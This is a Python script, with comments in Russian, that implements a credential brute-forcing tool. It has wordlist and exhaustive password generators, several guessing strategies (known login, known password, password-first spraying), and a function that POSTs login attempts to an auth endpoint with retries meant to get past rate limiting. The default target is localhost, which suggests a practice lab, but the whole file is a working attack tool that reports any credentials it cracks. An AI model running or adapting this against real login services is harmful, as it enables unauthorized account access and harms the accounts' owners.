from time import sleep
import requests


class ListGenerator:
    """
    Генератор строк из списка
    """

    def __init__(self, lines, limit=None):
        """
        Инициализация генератора строк
        :param lines: строки
        :param limit: лимит на количество пробуемых строк
        """
        self.i = 0
        self.lines = lines
        self.limit = limit

    def reset(self):
        """Сброс каретки на начало списка (использовать перед следующим запуском)"""
        self.i = 0

    def next(self):
        """Получение следущей строки"""
        if self.i >= len(self.lines):
            return None

        # в случае достижения лимита происходит выход из метода
        if self.limit is not None and self.i == self.limit:
            return None

        line = self.lines[self.i]
        self.i += 1
        return line


class FileLinesGenerator(ListGenerator):
    """
    Генератор строк из файла
    """

    def __init__(self, filepath="passwords_base.txt", limit=None):
        """
        Инициализация генератора работы со строками из файла
        :param filepath: путь к файлу
        :param limit: лимит на количество пробуемых строк
        """
        with open(filepath) as f:
            file_data = f.read()

        lines = file_data.split("\n")
        super().__init__(lines, limit)


class BruteForceGenerator:
    """
    Генератор строк с полным перебором
    """

    def __init__(self, alphabet="1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM!@#$%^&*()_+<>/| ",
                 min_length=0, max_length=64):
        """
        Инициализация генератора строк с полным перебором
        :param alphabet: строка символов, которые нужно использовать для подбора
        :param min_length: минимальная длина выходной строки
        :param max_length: максимальная длина выходной строки
        """
        self.alphabet = alphabet
        self.base = len(alphabet)
        self.min_length = min_length
        self.max_length = max_length
        self.length = min_length
        self.counter = 0

    def reset(self):
        """Сброс (использовать перед следующим запуском)"""
        self.length = self.min_length
        self.counter = 0

    def next(self):
        """Получение следущей строки"""
        result_password = ""
        number = self.counter
        while number > 0:
            rest = number % self.base
            result_password = self.alphabet[rest] + result_password
            number = number // self.base

        while len(result_password) < self.length:
            result_password = self.alphabet[0] + result_password

        # в случае получения последнего пароля текущей длины начинается работа со следующей длиной
        if self.alphabet[-1] * self.length == result_password:
            self.length += 1
            self.counter = 0
        else:
            self.counter += 1

        # при привышении максимальной длины происходит завершение работы метода и переход к следующей задаче
        if self.length > self.max_length:
            return

        return result_password


def use_known_login(login_generator, password_generator, query):
    """
    Попытки авторизоваться, зная логин
    :param login_generator: используемый генератор логинов
    :param password_generator: используемый генератор паролей
    :param query: используемый метод запроса
    :return: True - в случае удачной авторизации
    """
    login = login_generator.next()
    if login is None:
        return

    while True:
        password = password_generator.next()
        if password is None:
            break

        if query(login=login, password=password):
            print("SUCCESS", login, password)
            return


def use_known_password(login_generator, password_generator, query):
    """
    Попытки авторизоваться, зная пароль
    :param login_generator: используемый генератор логинов
    :param password_generator: используемый генератор паролей
    :param query: используемый метод запроса
    :return: True - в случае удачной авторизации
    """
    password = password_generator.next()
    if password is None:
        return

    while True:
        login = login_generator.next()
        if login is None:
            break

        if query(login=login, password=password):
            print("SUCCESS", login, password)
            return


def get_login_first(login_generator, password_generator, query, limit=1000):
    """
    Попытки авторизоваться, перебирая сначала логин, затем пароль
    :param login_generator: используемый генератор логинов
    :param password_generator: используемый генератор паролей
    :param query: используемый метод запроса
    :param limit: лимит на количество попыток подобрать пароль к конкретному логину
    :return: True - в случае удачной авторизации
    """
    while True:
        login = login_generator.next()
        if login is None:
            return

        password_generator.reset()
        for step in range(limit):
            password = password_generator.next()
            if password is None:
                break

            if query(login=login, password=password):
                print("SUCCESS", login, password)
                break


def get_password_first(login_generator, password_generator, query, limit=1000):
    """
    Попытки авторизоваться, перебирая сначала пароль, затем логин
    :param login_generator: используемый генератор логинов
    :param password_generator: используемый генератор паролей
    :param query: используемый метод запроса
    :param limit: лимит на количество попыток подобрать логин к конкретному паролю
    :return: True - в случае удачной авторизации
    """
    finished_logins = set()

    while True:
        password = password_generator.next()
        if password is None:
            return

        login_generator.reset()
        for step in range(limit):
            login = login_generator.next()
            if login in finished_logins:
                continue
            if login is None:
                break

            if query(login=login, password=password):
                finished_logins.add(login)
                print("SUCCESS", login, password)
                break


def send_auth_post_request(url="http://127.0.0.1:5000/auth", login="admin", password="admin", attempts=None):
    """
    Отправка post-запроса
    :param url: адрес отправки запроса
    :param login: используемый логин
    :param password: используемый пароль
    :param attempts: количество попыток отправить запрос (в случае защиты от большого числа последовательных запросов)
    :return: True - в случае, если запрос был успешен
    """
    if attempts is None:
        response = requests.post(url, json={"login": login, "password": password})
        return response.status_code == 200
    else:
        for attempt in range(attempts):
            try:
                response = requests.post(url, json={"login": login, "password": password})
                return response.status_code == 200
            except:
                if attempt <= 2:
                    sleep(1)

        return False


if __name__ == '__main__':
    # использование известного логина и подбора пароля из базы паролей
    use_known_login(
        login_generator=ListGenerator(["dummy"]),
        password_generator=FileLinesGenerator(),
        query=send_auth_post_request
    )

    # использоваеие известного логина и подбора пароля с помощью brut-force
    use_known_login(
        login_generator=ListGenerator(["admin"]),
        password_generator=BruteForceGenerator(alphabet="pabcdefghijklmnoqrstuvwxyz", min_length=4, max_length=4),
        query=send_auth_post_request
    )

    # использование известного пароля и подбора логина из базы паролей
    use_known_password(
        login_generator=FileLinesGenerator(),
        password_generator=ListGenerator(["pussy69"]),
        query=send_auth_post_request
    )

    # перебор логинов и паролей из базы паролей
    get_password_first(
        login_generator=FileLinesGenerator(limit=50),
        password_generator=FileLinesGenerator(limit=50),
        query=send_auth_post_request
    )
